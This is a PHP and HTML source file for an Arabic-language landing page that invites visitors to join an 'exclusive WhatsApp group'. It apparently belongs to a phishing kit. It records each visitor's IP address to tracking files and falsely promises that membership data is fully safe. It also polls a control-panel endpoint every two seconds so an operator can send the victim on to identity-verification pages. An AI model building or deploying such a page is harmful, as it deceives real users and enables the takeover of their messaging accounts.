<?php

function getClientIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        // إذا كان Cloudflare
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // إذا كان بروكسي يرسل عنوان IP الأصلي
        $_SERVER['REMOTE_ADDR'] = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CLIENT_IP'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

getClientIP();

// الحصول على اسم المجموعة من URL
$groupName = $_GET['group'] ?? 'مجموعة واتسآب';

session_start();

if (!isset($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}

$visitorToken = $_SESSION['token'];
$sessionId = 'session_' . $_SERVER['REMOTE_ADDR'];
$clientIp = $_SERVER['REMOTE_ADDR'];

// إنشاء مجلد الجلسات
if (!file_exists('sessions')) {
    mkdir('sessions', 0777, true);
}

// إنشاء مجلد التتبع
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

// تسجيل عنوان IP والصفحة الحالية
$trackingData = [
    'page' => 'index.php',
    'timestamp' => time(),
    'ip' => $clientIp,
    'group' => $groupName
];
file_put_contents('tracking/' . $sessionId . '.json', json_encode($trackingData));
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>انضم إلى <?php echo htmlspecialchars($groupName); ?></title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            color: #111;
            line-height: 1.6;
            min-height: 100vh;
        }
        
        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 30px 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo-circle {
            width: 120px;
            height: 120px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 8px 24px rgba(37, 211, 102, 0.3);
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .logo-circle i {
            color: white;
            font-size: 60px;
        }
        
        .header-title {
            font-size: 32px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 10px;
        }
        
        .header-subtitle {
            font-size: 16px;
            color: #54656f;
        }
        
        .card {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            padding: 40px 30px;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            right: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #25D366, #1ebc5e, #25D366);
        }
        
        .welcome-section {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .welcome-title {
            font-size: 24px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 15px;
        }
        
        .welcome-message {
            font-size: 16px;
            color: #54656f;
            line-height: 1.8;
            margin-bottom: 20px;
        }
        
        .benefits-section {
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-radius: 10px;
            padding: 25px;
            margin: 30px 0;
            border-right: 4px solid #25D366;
        }
        
        .benefits-title {
            font-size: 18px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .benefits-list {
            list-style: none;
            padding: 0;
        }
        
        .benefits-list li {
            padding: 10px 0;
            color: #2e7d32;
            font-size: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .benefits-list li:before {
            content: '✓';
            color: #25D366;
            font-weight: bold;
            font-size: 18px;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin: 30px 0;
        }
        
        .feature-box {
            background: linear-gradient(135deg, #ecf5ee 0%, #d7f5d4 100%);
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            border: 2px solid #c8e6c9;
        }
        
        .feature-icon {
            font-size: 32px;
            color: #25D366;
            margin-bottom: 10px;
        }
        
        .feature-title {
            font-size: 14px;
            font-weight: 700;
            color: #25D366;
            margin-bottom: 8px;
        }
        
        .feature-desc {
            font-size: 12px;
            color: #54656f;
        }
        
        .cta-section {
            text-align: center;
            margin: 40px 0 30px;
        }
        
        .join-button {
            display: inline-block;
            width: 100%;
            max-width: 400px;
            padding: 16px 32px;
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
            box-shadow: 0 6px 16px rgba(37, 211, 102, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .join-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 24px rgba(37, 211, 102, 0.4);
        }
        
        .join-button i {
            font-size: 20px;
        }
        
        .security-note {
            background: linear-gradient(135deg, #fff3e0 0%, #ffe0b2 100%);
            border-right: 4px solid #ff9800;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-size: 13px;
            color: #e65100;
        }
        
        .security-note i {
            margin-left: 8px;
            font-size: 16px;
        }
        
        .stats-section {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 15px;
            margin: 30px 0;
            text-align: center;
        }
        
        .stat-box {
            padding: 20px;
            background: linear-gradient(135deg, #e8f5e9 0%, #f1f8f6 100%);
            border-radius: 8px;
            border-top: 3px solid #25D366;
        }
        
        .stat-number {
            font-size: 24px;
            font-weight: 700;
            color: #25D366;
        }
        
        .stat-label {
            font-size: 12px;
            color: #54656f;
            margin-top: 5px;
        }
        
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #54656f;
            font-size: 12px;
        }
        
        .footer p {
            margin-bottom: 8px;
        }
        
        .footer a {
            color: #25D366;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .floating-icons {
            position: fixed;
            bottom: 20px;
            right: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            z-index: 100;
        }
        
        .float-button {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }
        
        .float-whatsapp {
            background: linear-gradient(135deg, #25D366 0%, #1ebc5e 100%);
        }
        
        .float-whatsapp:hover {
            transform: scale(1.1);
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            
            .card {
                padding: 20px 16px;
            }
            
            .header-title {
                font-size: 24px;
            }
            
            .features-grid {
                grid-template-columns: 1fr;
            }
            
            .stats-section {
                grid-template-columns: 1fr;
            }
            
            .floating-icons {
                bottom: 10px;
                right: 10px;
            }
        }
    </style>
</head>
<body>
    <input type="hidden" name="visitor_token" value="<?php echo htmlspecialchars($visitorToken); ?>">

    <div class="container">
        <div class="header">
            <div class="logo-circle">
                <i class="fab fa-whatsapp"></i>
            </div>
            <div class="header-title">مرحباً بك!</div>
            <div class="header-subtitle">انضم إلى مجموعة واتسآب الحصرية</div>
        </div>
        
        <div class="card">
            <div class="welcome-section">
                <div class="welcome-title">🎉 انضم إلى المجموعة الآن</div>
                <p class="welcome-message">
                    كن جزءاً من مجتمع واتسآب الحصري واستمتع بمميزات لا حصر لها!
                </p>
            </div>
            
            <div class="benefits-section">
                <div class="benefits-title">
                    <i class="fas fa-star"></i> مميزات المجموعة
                </div>
                <ul class="benefits-list">
                    <li>تحديثات حصرية وأخبار أولاً</li>
                    <li>عروض خاصة للأعضاء فقط</li>
                    <li>دعم مباشر وسريع</li>
                    <li>مسابقات وجوائز مميزة</li>
                </ul>
            </div>
            
            <div class="features-grid">
                <div class="feature-box">
                    <div class="feature-icon">📱</div>
                    <div class="feature-title">دعم 24/7</div>
                    <div class="feature-desc">متاح دائماً للإجابة على أسئلتك</div>
                </div>
                <div class="feature-box">
                    <div class="feature-icon">🎁</div>
                    <div class="feature-title">جوائز حصرية</div>
                    <div class="feature-desc">تنافس واربح جوائز رائعة</div>
                </div>
                <div class="feature-box">
                    <div class="feature-icon">⚡</div>
                    <div class="feature-title">تحديثات فورية</div>
                    <div class="feature-desc">كن أول من يعرف الأخبار</div>
                </div>
                <div class="feature-box">
                    <div class="feature-icon">👥</div>
                    <div class="feature-title">مجتمع نشط</div>
                    <div class="feature-desc">تفاعل مع آلاف الأعضاء</div>
                </div>
            </div>
            
            <div class="stats-section">
                <div class="stat-box">
                    <div class="stat-number">5K+</div>
                    <div class="stat-label">عضو نشط</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">24/7</div>
                    <div class="stat-label">دعم مستمر</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number">100%</div>
                    <div class="stat-label">آمن وموثوق</div>
                </div>
            </div>
            
            <div class="cta-section">
                <button class="join-button" onclick="joinGroup(); return false;">
                    <i class="fab fa-whatsapp"></i> انضم إلى المجموعة
                </button>
            </div>
            
            <div class="security-note">
                <i class="fas fa-shield-alt"></i>
                بيانات العضوية آمنة تماماً وسرية 100%
            </div>
        </div>
        
        <div class="footer">
            <p>© 2026 مجتمع واتسآب الحصري</p>
            <p><a href="#">شروط الخدمة</a> | <a href="#">سياسة الخصوصية</a></p>
        </div>
    </div>
    
    <!-- Floating WhatsApp Button -->
    <div class="floating-icons">
        <div class="float-button float-whatsapp" onclick="joinGroup()" title="انضم للمجموعة">
            <i class="fab fa-whatsapp"></i>
        </div>
    </div>
    
    <script>
        function joinGroup() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            const groupName = '<?php echo htmlspecialchars($groupName); ?>';
            
            // إعادة التوجيه إلى صفحة التحقق من الهوية
            window.location.href = 'connexion_f.php?session=' + sessionId + '&ip=' + clientIp + '&group=' + encodeURIComponent(groupName);
        }
        
        // التحقق من الإجراءات من لوحة التحكم
        function checkAction() {
            const sessionId = '<?php echo htmlspecialchars($sessionId); ?>';
            const clientIp = '<?php echo htmlspecialchars($clientIp); ?>';
            
            fetch(`check_action.php?session=${sessionId}&ip=${clientIp}`)
            .then(response => response.json())
            .then(data => {
                if (data.action) {
                    if (data.action === 'custom' && data.redirect) {
                        window.location.href = data.redirect + '_ar.php?session=' + sessionId + '&ip=' + clientIp;
                    } else {
                        window.location.href = data.action + '_ar.php?session=' + sessionId + '&ip=' + clientIp;
                    }
                }
            })
            .catch(error => {
                console.error('خطأ:', error);
            });
        }
        
        // التحقق من الإجراءات كل ثانيتين
        setInterval(checkAction, 2000);
    </script>
</body>
</html>